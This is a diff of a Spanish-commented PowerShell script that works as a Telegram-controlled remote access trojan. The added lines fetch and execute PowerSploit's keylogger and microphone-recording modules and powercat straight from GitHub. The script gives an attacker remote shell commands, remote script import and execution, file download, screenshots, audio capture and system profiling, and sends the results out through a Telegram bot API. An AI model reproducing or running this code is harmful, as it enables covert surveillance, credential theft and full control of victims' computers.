@@ -1,19 +1,32 @@
 
+################################################ Cargamos funciones de otros proyectos ########################################################################
+
+IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
+$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
+IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
+
+function graba-audio { param ($botkey,$chat,$segundos)
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
+$audio = $ruta + "\" + "audio.wav"
+if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
+Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret"
+bot-send -file $audio -botkey $botkey -chat_id $chat_id
+Remove-Item $audio
+}
+
 function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
-
 function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }
-
 function bot-send {
 
 param ($photo,$file,$botkey,$chat_id)
 
 $proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
-$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
+$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
 $curl_zip = $ruta + "\curl_752_1.zip"
 $curl = $ruta + "\" + "curl.exe"
 $curl_mod = $ruta + "\" + "curl_mod.exe"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
-if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
+if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip") #### Descargamos el Curl para poder hacer el envio de archivos multimedia. Esta parte está pendiente de mejora, para no usar software externo.
 [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
 [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null
 
@@ -37,7 +50,6 @@ Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 }
-
 function get-info {$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME 
 $Bios = Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME 
 $sheetS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME 
@@ -84,11 +96,7 @@ $datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFro
  $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
  "Pais" = $datos_ip_publica.country
  "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}
-
 function bot-public {param($botkey) $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}
-
-$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat
-
 function screen-shot {param ($botkey,$chat)
 
 $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
@@ -119,6 +127,25 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 
  screenshot $bounds $ruta
 
-bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
+bot-send -photo $ruta -botkey $botkey -chat_id $chat_id | Wait-Job
+Remove-Item $ruta
+
+}
+
+function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect)
+
+ if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
+ if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
+ if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
+ if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
+ if ($comando -like "/Audio ") {$comando -replace "/Audio ",""; graba-audio -botkey $botkey -chat $chat_id -segundos $comando}
+
 
 }
